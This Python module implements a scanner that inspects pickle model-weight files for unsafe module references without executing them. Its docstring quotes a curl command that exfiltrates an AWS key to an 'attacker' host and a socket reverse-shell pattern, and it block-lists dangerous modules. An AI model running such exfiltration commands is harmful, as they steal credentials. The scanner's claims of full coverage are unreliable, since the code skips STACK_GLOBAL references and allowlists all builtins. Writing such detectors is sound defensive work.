"""PickleOpcodeScanner — detects code-execution risk in pickle weight files.

The threat: a pickle file's deserialization is *executable code*. Loading
a malicious .pt / .pth / .pkl file with `torch.load()` or `pickle.load()`
runs whatever the malicious author embedded — typically `os.system()`,
`subprocess.Popen()`, or `socket` calls to exfiltrate credentials.

Recent real-world examples on HuggingFace and elsewhere have used:
  - `os.system('curl https://attacker/?key=' + os.environ['AWS_KEY'])`
  - `subprocess.run(['python', '-c', '<exfil payload>'])`
  - `__import__('socket').socket(...)` for reverse-shell behavior.

The defense: parse the pickle opcode stream WITHOUT executing it (Python's
``pickletools`` module does exactly this) and inspect every GLOBAL opcode
for references to non-allowlisted modules. Anything outside an allowlist
of model-related modules (torch, numpy, collections, builtins…) is
flagged. High-precision because the pickle format is structurally simple
and the allowlist is well-understood.

Inspired by `picklescan` and HuggingFace's ``security_scanner``. Same
core technique, scoped for portfolio integration.
"""

from __future__ import annotations

import io
import pickletools
from pathlib import Path

from .base import Finding, ModelArtifact


# File extensions whose contents are pickle streams.
_PICKLE_EXTENSIONS = {".pt", ".pth", ".pkl", ".bin", ".joblib", ".pickle"}


# Modules an allowed pickle is permitted to reference. Anything outside
# this set is treated as suspicious. The list is a pragmatic floor for
# PyTorch / NumPy / scikit-learn ecosystems; production deployments
# should narrow this further per their actual model-loading code paths.
_ALLOWED_MODULES = {
    "torch", "torch._tensor", "torch._utils", "torch.nn", "torch.nn.modules",
    "torch.nn.parameter", "torch.storage", "torch.serialization",
    "torch.distributed", "torch._C", "torch.cuda",
    "numpy", "numpy.core", "numpy.core.multiarray", "numpy._core",
    "numpy._core.multiarray", "numpy.dtype", "numpy.ndarray",
    "collections", "collections.abc",
    "builtins", "__builtin__", "_codecs",
    "copy_reg", "copyreg",
    "tensorflow", "tensorflow.keras",
    "transformers", "transformers.modeling_utils",
    "sklearn", "sklearn.base", "sklearn.linear_model",
}


# Modules that, when seen in a pickle, are unambiguous compromise indicators.
# The general allowlist already excludes them, but listing explicitly so the
# scanner can tag each with the matching ATLAS / severity.
_HARDCODED_BAD = {
    "os": ("critical", "OS-level command execution risk via os module"),
    "subprocess": ("critical", "Subprocess execution risk via subprocess module"),
    "socket": ("critical", "Network exfiltration risk via socket module"),
    "shutil": ("high", "Filesystem manipulation risk via shutil module"),
    "tempfile": ("medium", "Temp-file write risk via tempfile module"),
    "ctypes": ("critical", "Native code execution risk via ctypes module"),
    "_winreg": ("high", "Windows registry access risk"),
    "winreg": ("high", "Windows registry access risk"),
    "requests": ("high", "Outbound HTTP risk via requests library"),
    "urllib": ("high", "Outbound HTTP risk via urllib"),
    "urllib.request": ("high", "Outbound HTTP risk via urllib.request"),
    "httpx": ("high", "Outbound HTTP risk via httpx"),
    "pickle": ("medium", "Recursive pickle invocation"),
    "marshal": ("high", "Code-object deserialization risk via marshal"),
    "exec": ("critical", "Direct exec() reference"),
    "eval": ("critical", "Direct eval() reference"),
    "__import__": ("critical", "Dynamic import via __import__"),
    "compile": ("high", "Direct compile() reference"),
}


class PickleOpcodeScanner:
    name = "pickle_opcode_scanner"
    category = "pickle_unsafe_opcode"

    def __init__(self, allowed_modules: set[str] | None = None) -> None:
        self.allowed_modules: set[str] = (
            allowed_modules if allowed_modules is not None else set(_ALLOWED_MODULES)
        )

    def scan(self, artifact: ModelArtifact) -> list[Finding]:
        findings: list[Finding] = []
        for path in artifact.files():
            if path.suffix.lower() not in _PICKLE_EXTENSIONS:
                continue
            findings.extend(self._scan_file(path, artifact))
        return findings

    def _scan_file(self, path: Path, artifact: ModelArtifact) -> list[Finding]:
        rel = artifact.relative(path)
        try:
            data = path.read_bytes()
        except OSError as exc:
            return [self._make_error_finding(rel, f"Could not read file: {exc}")]

        stream = io.BytesIO(data)
        suspicious: list[tuple[int, str]] = []  # (opcode_pos, module_name)
        try:
            for op, arg, pos in pickletools.genops(stream):
                op_name = getattr(op, "name", None)
                if op_name in {"GLOBAL", "STACK_GLOBAL"}:
                    module_name = self._extract_module(arg)
                    if module_name and not self._is_allowed(module_name):
                        suspicious.append((pos or 0, module_name))
        except Exception as exc:  # noqa: BLE001 — malformed pickle = suspicious
            return [
                Finding(
                    finding_id=f"MS-PKL-malformed-{rel}",
                    artifact_path=rel,
                    scanner=self.name,
                    category="pickle_malformed",
                    severity="medium",
                    title="Pickle stream failed to parse",
                    rationale=(
                        f"pickletools.genops raised {type(exc).__name__}: {exc}. "
                        "Malformed pickles can be intentional obfuscation; treat "
                        "as suspicious until proven safe."
                    ),
                    matched_evidence=str(exc)[:240],
                )
            ]

        # Aggregate findings — one per unique offending module per file.
        seen: set[str] = set()
        results: list[Finding] = []
        for pos, module_name in suspicious:
            if module_name in seen:
                continue
            seen.add(module_name)
            severity, hint = _HARDCODED_BAD.get(
                module_name, ("high", "non-allowlisted module reference"),
            )
            results.append(
                Finding(
                    finding_id=f"MS-PKL-{module_name.replace('.', '_')}-{rel}",
                    artifact_path=rel,
                    scanner=self.name,
                    category="pickle_unsafe_opcode",
                    severity=severity,
                    title=f"Unsafe pickle GLOBAL reference — {module_name}",
                    rationale=(
                        f"Pickle file references the {module_name!r} module via a "
                        f"GLOBAL opcode at byte offset {pos}. {hint}. Loading this "
                        "file with torch.load() / pickle.load() may execute code "
                        "from this module. Block ingestion."
                    ),
                    matched_evidence=f"GLOBAL opcode @ byte {pos}: {module_name}",
                )
            )
        return results

    # ------------------------------------------------------------------

    def _extract_module(self, arg) -> str | None:
        """GLOBAL's arg is 'module name' (space-separated). STACK_GLOBAL's is None."""
        if not arg:
            return None
        if isinstance(arg, str):
            parts = arg.split(" ", 1)
            return parts[0] if parts else None
        return None

    def _is_allowed(self, module_name: str) -> bool:
        # Match the module exactly OR a prefix: `torch.nn.modules` is allowed
        # if `torch` is allowed.
        if module_name in self.allowed_modules:
            return True
        for allowed in self.allowed_modules:
            if module_name.startswith(allowed + "."):
                return True
        return False

    def _make_error_finding(self, rel: str, msg: str) -> Finding:
        return Finding(
            finding_id=f"MS-PKL-error-{rel}",
            artifact_path=rel,
            scanner=self.name,
            category="pickle_read_error",
            severity="low",
            title="Could not read candidate pickle file",
            rationale=msg,
        )
